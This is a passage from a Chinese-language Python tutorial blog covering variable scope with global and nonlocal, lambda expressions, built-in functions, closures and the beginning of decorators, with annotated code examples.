class="built_in">print</span>(a)</span><br><span class="line">    fun1()      <span class="comment">#结果为：20，从该函数调用所在行以上的代码里找最新的数据，这里是20</span></span><br><span class="line">    a = <span class="number">30</span></span><br><span class="line">    fun1()    <span class="comment">#结果为：30，从该函数调用所在行之前的代码里找最新的数据，这里是30</span></span><br><span class="line">    <span class="built_in">print</span>(a)   <span class="comment">#结果为：30，从本级作用域开始找，本级作用域的a的最新值是30,</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">fun()</span><br><span class="line"><span class="comment">#最终结果为：20   20    30    30</span></span><br></pre></td></tr></table></figure>







<p>面试题：</p>
<ul>
<li><p>定义不同的函数实现10086的不同功能，然后用户输入不同的内容，程序就调用不同的函数，如果用户输入的内容不存在，那么就提示用户输入错误，此题假设选择超过5个，所以不能使用5个if，这里为了演示，不写那么多个</p>
</li>
<li><p>考察点：如果 if  … else语句超过5个，就不建议使用，太繁琐了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#假设业务数量超过5个，所以不能使用5个if</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">business_query</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;业务查询&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;业务查询成功&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phone_recharge</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;手机充值&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;手机充值成功！&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Business_handling</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;业务办理&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;业务办理成功&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Human_services</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;人工服务&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;xx客服为你服务！&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">&#x27;f1&#x27;</span>:business_query,<span class="string">&#x27;f2&#x27;</span>:phone_recharge,<span class="string">&#x27;f3&#x27;</span>:Business_handling,<span class="string">&#x27;f4&#x27;</span>:Human_services&#125;</span><br><span class="line">choice = <span class="built_in">input</span>(<span class="string">&#x27;请输入f1 - f4 选择不同的服务：&#x27;</span>)     </span><br><span class="line">result = dic.get(choice)       <span class="comment">#将函数的地址赋值给变量result</span></span><br><span class="line"><span class="keyword">if</span> result :                                <span class="comment">#如果输入的值在字典的key里</span></span><br><span class="line">    result()                        <span class="comment">#调用函数</span></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;输入错误！&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-6全局变量和局部变量总结"><a href="#5-6全局变量和局部变量总结" class="headerlink" title="5.6全局变量和局部变量总结"></a>5.6全局变量和局部变量总结</h3><p>全局变量和局部变量命名规范：</p>
<ul>
<li>全局变量：全部用大写来表示，例如：STUDENT_NAME</li>
<li>局部变量：全部用小写来表示，例如：student_name</li>
</ul>
<p>总结：</p>
<ul>
<li><p>子级作用域只能找到负极作用域（包括全局作用域）的数据，但是默认无法在子级作用域对该数据进行重新赋值，如果使用等于号进行强制操作，那样的结果只是新创建了一个变量而已，而不是对父级作用域的变量进行重新赋值，这里需要注意</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#默认无法在子级作用域对父级作用域的变量进行重新赋值def fun():    AGE = 20  #这里并不是对全局变量AGE重新赋值，相当于是重新创建了一个变量AGE，    print(AGE)  #结果为：20AGE = 10   #全局变量用大写来表示fun()</span></span><br></pre></td></tr></table></figure></li>
<li><p>子级作用域在父级作用域查找数据，如果该数据类型是可变类型，那么可以在子级作用域对该可变类型数据进行修改</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#如果父级作用域的数据类型为可变类型，则在子级作用域中可以对其进行修改def fun():    AGE.append(66)    print(AGE)  #结果为：[1, 2, 66]AGE = [1,2]   #列表为可变类型fun()</span></span><br></pre></td></tr></table></figure>

<p>非要在子级作用域给父级作用域的数据进行重新赋值该怎么办？</p>
<ul>
<li><p>global：直接定位到全局作用域的数据，使用了global + 变量名 后，在该子级作用域中如果有赋值代码，那么就相当于把全局作用域的数据进行重新赋值了；</p>
<p>注意点：定位的是全局作用域</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用global，实现在子级作用域给全局作用域的变量进行重新赋值def fun():    AGE = 20    print(AGE)  #结果为：20    def fun1():        global AGE    #定位到全局变量AGE，接下来的赋值就是对全局变量的重新赋值        AGE = 30     #这里相当于是对全局变量的重新赋值    fun1()   #结果为：20    print(AGE)AGE = 10   fun()print(AGE)    #结果为30，因为fun1使用了global，对全局变量AGE进行了重新赋值</span></span><br></pre></td></tr></table></figure></li>
<li><p>nonlocal：直接定位到当前子级作用域的父级作用域，如果使用了nonlocal + 变量名 后，在该子级作用域中如果有赋值代码，那么就相当于把该子级作用域的父级作用域里的变量进行了重新赋值</p>
<p>注意点：针对的仅仅是当前子级作用域的父级作用域的变量，如果想对更上级的父级作用域（不包括全局作用域）的变量进行重新赋值，那么需要在该子级作用域的父级作用域也使用 nonlocal + 变量名  来实现</p>
<p>易错点：通过nonlocal对上一级的变量进行重新赋值，这个重新赋值的结果以当前所在子作用域的最终结果为准</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用nonlocal对上一级作用域的变量进行重新赋值（一）def fun():    AGE = 20    print(AGE)  #结果为：20    def fun1():        nonlocal AGE    #定位到当前子级作用域的父级作用域，接下来的赋值就是对上一级作用域变量的重新赋值        AGE = 30     #这里相当于是对上一级作用域的重新赋值    fun1()       print(AGE)   #结果为：30,因为fun1使用了nonlocal对fun的作用域里的AGE进行了重新赋值AGE = 10fun()print(AGE)    #结果为10#使用多个nonlocal对上上级作用域的变量进行重新赋值（二）def fun():    AGE = 20    print(AGE)  #结果为：20    def fun1():        nonlocal AGE            AGE = 30     #在fun2没执行时AGE是30，相当于第一次赋值，执行fun2后，相当于对AGE重新赋值，所以最终AGE为40        def fun2():            nonlocal AGE            AGE = 40      #执行到这里，对上一级作用域的AGE修改为40，相当于对上上级作用域的AGE进行二次赋值        fun2()    fun1()          print(AGE)   #到这里，AGE为经过二次赋值，最终结果为：40AGE = 10fun()print(AGE)    #结果为10#通过nonlocal对上一级的变量进行重新赋值，这个重新赋值的结果以当前所在子作用域的最终结果为准def fun():    AGE = 20    def fun1():        nonlocal AGE        AGE = 30     #第一次赋值        AGE = 666    #第二次赋值，以最终的赋值为结果    fun1()    print(AGE)   #以它的子作用域的最终值为结果，结果为666AGE = 10fun()print(AGE)    #结果为10</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>global和nonlocal的应用场景：</p>
<ul>
<li>global：一般情况下不使用，虽然可以对全局变量进行重新赋值，但是很容易造成代码混乱</li>
<li>nonlocal：面试必考</li>
</ul>
<h3 id="5-7-lambda表达式"><a href="#5-7-lambda表达式" class="headerlink" title="5.7 lambda表达式"></a>5.7 lambda表达式</h3><p>lambda表达式和三元运算(三目运算)的区别：</p>
<ul>
<li><p>三元运算：表达简单的 if…else语句</p>
</li>
<li><p>lambda表达式：表达简单的函数</p>
<ul>
<li><p>特点：是匿名函数，意思就是没有函数名</p>
</li>
<li><p>注意点：函数必须特别简单，函数的代码内容只有 return语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">a,b</span>):</span>      <span class="keyword">return</span> a+b可以转换成<span class="keyword">lambda</span>语句:<span class="keyword">lambda</span> a,b:a+b</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>lambda表达式的基本结构：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> 参数 : 需要返回的内容</span><br></pre></td></tr></table></figure>



<p>lambda表达式的特点：</p>
<ul>
<li>自带隐藏return</li>
</ul>
<p>lambda的几种表现形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1、有两个参数时：参数a b之间用逗号隔开result = lambda a,b:a+b   #result相当于是个函数名，两个参数名写在冒号前print(result(10,20))  #结果为：30,此处传递参数10,20&#x27;&#x27;&#x27;相当于代码：def result(a,b):    return a+bprint(result(10,20))&#x27;&#x27;&#x27;#2、有1个参数时：冒号前就只需要写一个参数 aresult = lambda a:a+50  #result相当于是个函数名,只有一个参数：aprint(result(10))  #结果为：60，此处传参10&#x27;&#x27;&#x27;相当于代码：def result(a):    return a+50print(result(10))&#x27;&#x27;&#x27;#3、有0个参数时：冒号前则不需要写参数名result = lambda :666  #0个参数，冒号前就不填参数print(result())  #结果为：666&#x27;&#x27;&#x27;相当于代码：def result():    return 666print(result())&#x27;&#x27;&#x27;#4、用万能参数作为参数时：result = lambda *args,**kwargs:args  #自带return功能print(result(20,16))  #结果为：(20,16)&#x27;&#x27;&#x27;相当于代码：def result(*args,**kwargs):    return argsprint(result(20,16))&#x27;&#x27;&#x27;#5、当代码部分为变量时：从父级作用域开始找a = 10result = lambda :a + 60  #lambda的定义，使其自身无法给变量赋值，所以如果查找变量，必须要去它的父级去找print(result())  #结果为：70&#x27;&#x27;&#x27;相当于代码：def result():    return aprint(result())&#x27;&#x27;&#x27;#6、和三元运算混合使用result = lambda a,b:999 if a &gt; b else 555  #如果a&gt;b，则返回999，否则返回555print(result(20,10))  #结果为：999&#x27;&#x27;&#x27;相当于代码：def result(a,b):    return 999 if a &gt; b else 555print(result(20,10))&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



















<h3 id="5-8-内置函数"><a href="#5-8-内置函数" class="headerlink" title="5.8 内置函数"></a>5.8 内置函数</h3><p>分类：</p>
<ul>
<li>输入、输出</li>
<li>强制转换</li>
<li>数学运算</li>
<li>进制转换</li>
<li>其它函数</li>
</ul>
<p>输入、输出函数：print()、input()</p>
<p>强制转换函数：</p>
<ul>
<li>int</li>
<li>bool</li>
<li>str</li>
<li>tuple</li>
<li>list</li>
<li>dict</li>
<li>set</li>
</ul>
<p>数学运算函数：</p>
<ul>
<li><p>绝对值：abs()</p>
</li>
<li><p>转小数：float()</p>
</li>
<li><p>最大值：max()</p>
</li>
<li><p>最小值：min()</p>
</li>
<li><p>求和：sum()</p>
</li>
<li><p>求商和余数：divmod()</p>
<p>功能：第一个参数为除数，第二个参数为被除数，返回的结果是一个元组，元组的第一个参数时商，第二个参数时余数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">divmod</span>(<span class="number">50</span>,<span class="number">22</span>))   <span class="comment">#结果为:(2, 6)   ,返回的是元组，第一是商，第二个是余数</span></span><br></pre></td></tr></table></figure>

<p>现实应用：分页显示内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">前提：需要打印的数据内容太多，一页显示不了</span></span><br><span class="line"><span class="string">需求：按照用户要求的多少条数据为一页，让用户输入页数，并显示</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">lis = []     <span class="comment">#用来存放需要打印的数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">545</span>):</span><br><span class="line">    message = <span class="string">&#x27;这是我第%d次结婚&#x27;</span>%i</span><br><span class="line">    lis.append(message)                        <span class="comment">#构造大批量的内容，为后续的分页做准备</span></span><br><span class="line">    <span class="comment"># print(message)   #直接打印的话，内容太多，一屏都无法显示完，所以需要分页显示</span></span><br><span class="line">message_page = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请设定每页需要显示多少条内容：&#x27;</span>))</span><br><span class="line">page_all,page_remaining = <span class="built_in">divmod</span>(<span class="built_in">len</span>(lis),message_page)    <span class="comment">#得到一共有多少页，和多余的行数</span></span><br><span class="line"><span class="keyword">if</span> page_remaining  != <span class="number">0</span> :</span><br><span class="line">    page_all += <span class="number">1</span>         <span class="comment">#如果还有多余的内容，也需要多加一页来显示</span></span><br><span class="line">page_input = <span class="built_in">input</span>(<span class="string">&#x27;请输入需要查看第几页：&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>&lt; <span class="built_in">int</span>(page_input) &lt; page_all :    <span class="comment">#判断输入的页码是否在范围之内</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> lis[(<span class="built_in">int</span>(page_input) - <span class="number">1</span>) *message_page : <span class="built_in">int</span>(page_input)*message_page ]   :   <span class="comment">#查看页数*每页的显示数进行切片</span></span><br><span class="line">        <span class="built_in">print</span>(v)                     <span class="comment">#遍历打印切片的内容</span></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;输入页码错误！&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>幂运算：pow()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">3</span>))  <span class="comment">#2的3次方，结果为：8</span></span><br></pre></td></tr></table></figure></li>
<li><p>保留小数：round()</p>
<p>特点：自动四舍五入；如果没有指定需要保留的小数位，则默认保留整数，保留后的结果为四舍五入的结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用法：round(小数,保留位数)print(round(3.567))  #没有指定保留位数时，默认不保留小数位，结果为：4print(round(3.567,1))  #保留1个小数位，并四舍五入，结果为：3.6</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>进制转换：</p>
<ul>
<li><p>核心原则：以十进制为中转站，进行所有的数据互转</p>
<p>原因：所有的进制可以转换成十进制，十进制可以转换成其他所有的进制，但是非十进制转非十进制，则无法直接转换，需要用十进制来作中转</p>
</li>
<li><p>十进制转其他进制：</p>
<p>十进制转二进制:bin()</p>
<p>十进制转八进制:oct()</p>
<p>十进制转十六进制:hex()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用到函数：bin,oct,hexnum = 50print(bin(num))   #转二进制，结果：0b110010print(oct(num))   #转八进制，结果：0o62print(hex(num))   #转十六进制，结果：0x32</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>其他进制转十进制</p>
<p>语法：int(需要转换的数据,base = 数值(该数据的进制数))</p>
<p>特性：平常可以不写base，直接写数字即可，因为是位置传参；如果数字不写，base默认是10</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#其他进制转十进制num = &#x27;0b110010&#x27;    #二进制num1 = &#x27;0o62&#x27;      #八进制num2 = &#x27;0x32&#x27;       #十六进制print(int(num,2))   #转十进制，结果：50  ,需要转换的数据的进制数是2print(int(num1,8))   #转十进制，结果：50，需要转换的数据的进制数是8print(int(num2,16))   #转十进制，结果：50，需要转换的数据的进制数是16</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>非10进制转非10进制：<ul>
<li>核心：用10进制做中转</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#非10进制转非10进制：用10进制做中转a = &#x27;0b110010&#x27;  #二进制print(  oct(    int(a,2)    )  )  #先将二进制转10进制，然后将10进制转八进制 ，结果为：0o62print(  hex(    int(a,2)    )  )  #先将二进制转10进制，然后将10进制转八进制 ，结果为：0x32</span></span><br></pre></td></tr></table></figure>





<p>其它内置函数：</p>
<ul>
<li>open</li>
<li>id</li>
<li>type</li>
<li>range</li>
<li>len</li>
</ul>
<p>进制练习题：</p>
<ul>
<li><p>将’192.168.12.79’转换为二进制，用点 . 连接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ip = <span class="string">&#x27;192.168.12.79&#x27;</span>ip = ip.split(<span class="string">&#x27;.&#x27;</span>)   <span class="comment">#提取每一个数字for index in range(0,len(ip)):    ip[index] = bin(int(ip[index]))   #将列表里的每一个字符转成整型，然后转成二进制ip = &#x27;.&#x27;.join(ip)    #用.拼接起来print(ip)   #结果为：0b11000000.0b10101000.0b1100.0b1001111</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>进制面试题：</p>
<ul>
<li><p>将’192.168.12.79’转换为二进制，用点 . 拼接起来形成一个新的二进制，然后将该二进制转换成十进制</p>
</li>
<li><p>要求：用函数实现；要求每个数转换成的二进制的位数都是8位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_change</span>(<span class="params">ip</span>):</span>    ip = ip.split(<span class="string">&#x27;.&#x27;</span>)   <span class="comment">#提取每一个数字    lis_ip = []          #储存处理后的二进制数据    for v in ip:        v = bin(int(v)).replace(&#x27;0b&#x27;,&#x27;&#x27;)   #将每个数字转换成二进制，并去掉0b        v = &#x27;0&#x27;*( 8 - len(v)) + v      #因为是utf-8编码，所以统一按8位算，去掉0b后，不足8位在前面补0        lis_ip.append(v)    ip_bin = &#x27;&#x27;.join(lis_ip)    #将二进制拼接起来    ip_int = int(ip_bin,2)    #将二进制字符串转换为十进制    return ip_int    #返回已经转换为十进制的值IP = &#x27;192.168.12.79&#x27;result = ip_change(IP)print(result)   #结果为：0b11000000.0b10101000.0b1100.0b1001111</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>高级的内置函数：</p>
<ul>
<li><p>特点：实际工作中使用的少，但是面试遇到的多</p>
</li>
<li><p>map:对一组序列中的每个元素进行相同的操作</p>
<p>格式：map(函数,待操作的数据)</p>
<p>注意点：这里的函数既可以是函数名，也可以是lambda表达式</p>
<p>易错点：最后展示结果，必须要list来展示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#方map(函数(x),序列)a = [2,3,4]result = map(lambda x : x*100,a)  #a中的每一个元素，传递到了函数里进行处理，然后将处理后的元素加入到一个新列表print(list(result))  #因为result是列表，所以最好用list来显示，结果为：[200, 300, 400]</span></span><br></pre></td></tr></table></figure></li>
<li><p>reduce：将序列中的所有元素合并成一个元素</p>
<p>格式：reduce(函数(x,y),序列)</p>
<p>注意点：这里的函数既可以是函数名，也可以是lambda表达式</p>
<p>​                reduce在python3中已经被去除，如果想要使用，必须要导入functools模块调用reduce函数</p>
<p>易错点：最后的展示结果，因为result是一个值，所以直接打印即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#reduce(函数(x,y),序列)import functools   #在python3中，reduce已经去掉了，所以需要调用模块functools来实现a = [2,3,4,5]  result = functools.reduce(lambda x,y :x+y,a)  #lambda必须要接受两个参数，这里的意思是求序列所有元素的和,返回的是一个值#第一次传递第一个元素和第二个元素，二者相加得到的值作为第二次传递参数时的第一个参数，第二个参数相当于第三个元素，通过这种方法实现累加print(result)  #因为result是一个值，所以直接显示，结果为：14</span></span><br></pre></td></tr></table></figure></li>
<li><p>filter：将序列中的元素进行过滤，如果存在该元素，则返回True，同时将该元素加到一个新列表中</p>
<p>格式：filter(函数(x),序列)</p>
<p>注意点：这里的函数既可以是函数名，也可以是lambda表达式</p>
<p>易错点：最后展示结果，必须要list来展示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filter(函数(x),序列)</span></span><br><span class="line">a = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">result = <span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x&gt;<span class="number">3</span> ,a)  <span class="comment">#将所有元素和3进行比对，如果返回的比对结果为True，则将该数据加到一个新列表中</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(result))  <span class="comment">#结果为：[4, 5]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-9-函数的闭包"><a href="#5-9-函数的闭包" class="headerlink" title="5.9 函数的闭包"></a>5.9 函数的闭包</h3><p>功能：保留传递到函数里的变量(数据)不被销毁，方便下次直接使用</p>
<p>关键：</p>
<ul>
<li>封装值</li>
<li>内部函数需要使用</li>
</ul>
<p>特性：双层函数；外层函数必须要接收变量，内层函数的代码必须要操作该变量，如果不操作，那么变量无人使用，就会被销毁，有操作，那么就不会被销毁</p>
<p>基本原理：构造双层函数，外层函数返回内存函数的地址，作为返回值赋值给一个变量，然后用该变量来调用内层函数，因为执行外层函数时，内层函数里有对传入的变量进行操作的代码，所以传入的变量没被销毁，使其得以保留了下来，所以相当于外层函数代码没有执行完毕，所以外层函数不会被销毁，因此传入的变量就因此保存了下来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#目的：保留num这个变量所代表的的值，使其不被销毁，方便下次调用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span>  <span class="comment">#此函数的目的就是保留num</span></span><br><span class="line">        <span class="built_in">print</span>(num + <span class="number">10</span>)    <span class="comment">#代码内容必须要包含num，否则就起不到保留变量的作用</span></span><br><span class="line">    <span class="keyword">return</span> inner   <span class="comment">#返回inner函数的地址</span></span><br><span class="line">index = fun(<span class="number">50</span>)   <span class="comment">#将返回的inner函数的地址赋值给index，因为inner没执行完毕，所以fun没有被销毁，所以就相当于将num给保留了下来</span></span><br><span class="line">index()  <span class="comment">#方便此次调用；结果为：60</span></span><br></pre></td></tr></table></figure>

<p>闭包的关键点：</p>
<ul>
<li>让外层函数不被销毁，从而保留传递给外层函数的变量</li>
<li>将内存函数的地址作为返回值</li>
</ul>
<p>闭包完成后调用内层函数，怎么找数据？</p>
<ul>
<li>内层函数被B创建，那么B就是内层函数的父级，如果内层函数没找到数据，就去它的父级即去找</li>
</ul>
<p>同一函数被多次调用：</p>
<ul>
<li><p>每次调用都创建一个内存空间，这些内存空间互相独立，互不影响</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#多次调用同一个函数时</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(num + <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line">index = fun(<span class="number">50</span>)  <span class="comment">#执行fun，开辟了一个内存，此处保留了50</span></span><br><span class="line">index1 = fun(<span class="number">80</span>)   <span class="comment">#第二次执行fun，开辟了另外一个内存，和第一个内存互相独立，此处保留了80</span></span><br><span class="line">index()  <span class="comment">#结果为：60</span></span><br><span class="line">index1()   <span class="comment">#结果为：90</span></span><br></pre></td></tr></table></figure>

<p>示意图：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200425095052.png" alt="image-20200425095050562"></p>
</li>
</ul>
<p>练习题：</p>
<ul>
<li><p>函数内调用函数：这两个函数的父级都是全局作用域</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数内调用函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    fun()</span><br><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">inner()   <span class="comment">#结果为 oldboy   inner()   #结果为 oldboy</span></span><br></pre></td></tr></table></figure>

<p>示意图：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200424193940.png" alt="image-20200424193937796"></p>
</li>
<li><p>函数内嵌套函数：内层函数由谁创建，谁就是该内层函数的父级，内层函数找数据就先在当前作用域查找，如果没有就去其父级作用域查找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数内嵌套函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(a)   <span class="comment">#结果为：   oldboy</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span>    <span class="comment">#它由inner所在的作用域创建</span></span><br><span class="line">        <span class="built_in">print</span>(a)   <span class="comment">#所以查找数据先从本级作用域查找，然后去父级作用域查找，inner代码所在作用域</span></span><br><span class="line">    a = <span class="string">&#x27;666&#x27;</span></span><br><span class="line">    fun()   <span class="comment">#结果为：666</span></span><br><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">inner(a)   <span class="comment">#结果为 oldboy   666   </span></span><br></pre></td></tr></table></figure>

<p>示意图：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200424194746.png" alt="image-20200424194744624"></p>
</li>
<li><p>在全局作用域调用函数A内嵌套的函数B：闭包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在全局作用与调用函数A内嵌套的函数B</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(a)   <span class="comment">#结果为：   oldboy</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span>    <span class="comment">#它由inner所在的作用域创建</span></span><br><span class="line">        <span class="built_in">print</span>(a)   <span class="comment">#所以查找数据先从本级作用域查找，然后去父级作用域查找，inner代码所在作用域</span></span><br><span class="line">    a = <span class="string">&#x27;666&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> fun</span><br><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">index = inner(a)   <span class="comment">#结果为 oldboy ，并将fun函数地址赋值给index</span></span><br><span class="line">index()  <span class="comment">#调用内层函数fun，fun找数据先从本级作用域找，如果没有则从创建它的父级作用域inner代码所在作用域找</span></span><br></pre></td></tr></table></figure>

<p>示意图：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200425092934.png" alt="image-20200425092932401"></p>
</li>
</ul>
<p>闭包和for的结合使用：</p>
<ul>
<li><p>目的：保留每次for得到的数据，如果不使用闭包</p>
</li>
<li><p>闭包和不闭包的区别</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用闭包保留每次for循环的数据:也就是a的值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span>    <span class="comment">#闭包保留传进来的a</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">return</span> fun</span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    index = inner(a)</span><br><span class="line">    lis.append(index)</span><br><span class="line">lis[<span class="number">0</span>]()  <span class="comment">#结果为：0</span></span><br><span class="line">lis[<span class="number">2</span>]()   <span class="comment">#结果为：2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#不使用闭包出现的问题</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    lis.append(inner)</span><br><span class="line">lis[<span class="number">0</span>]()   <span class="comment"># 结果是2 </span></span><br><span class="line">lis[<span class="number">2</span>]()   <span class="comment"># 结果是2 </span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-10-装饰器"><a href="#5-10-装饰器" class="headerlink" title="5.10 装饰器"></a>5.10 装饰器</h3><h4 id="5-10-1-装饰器基本知识"><a href="#5-10-1-装饰器基本知识" class="headerlink" title="5.10.1 装饰器基本知识"></a>5.10.1 装饰器基本知识</h4><p>定义：类似于现实中的化妆，对人脸进行修饰</p>
<p>应用场景：</p>
<ul>
<li>希望在不修改原函数的情况下，给原函数增加功能；</li>
<li>批量给多个函数增加类似的功能</li>
</ul>
<p>针对对象：函数</p>
<p>装饰器的本质：就是构造一个装饰器（函数B），然后将需要装饰的函数A作为参数传到B里，相当于就是在B里新建了一个变量，该变量指向了函数A，所以我们可以在装饰器的作用域中，调用该变量（也就是调用原函数），并且我们可以调用变量之前或者之后，写上其他操作代码，比如打印’666’，或者循环调用该变量。这些操作对原函数A所指向的函数代码没有任何影响</p>
<p>装饰器的特点：</p>
<ul>
<li>在不改变原函数的条件下，如果想对原函数的功能进行增加，那么就需要构造一个装饰器，将需要修饰的函数放到该装饰器中，即可对原函数进行增加功能。</li>
<li>无法对原函数的代码进行修改，同时，只能在原函数的基础上增加功能，并不能减少功能，可以在装饰器的作用域里进行添加修饰代码，该修饰代码可以放在被修饰的函数之前或者之后</li>
</ul>
<p>装饰器的核心：</p>
<ul>
<li>函数名的重新赋值（如果函数名被重新赋值了一个数值，那么它就不再是函数了）</li>
<li>被装饰函数的函数名作为参数传递给装饰器</li>
</ul>
<p>装饰器和闭包的区别：</p>
<ul>
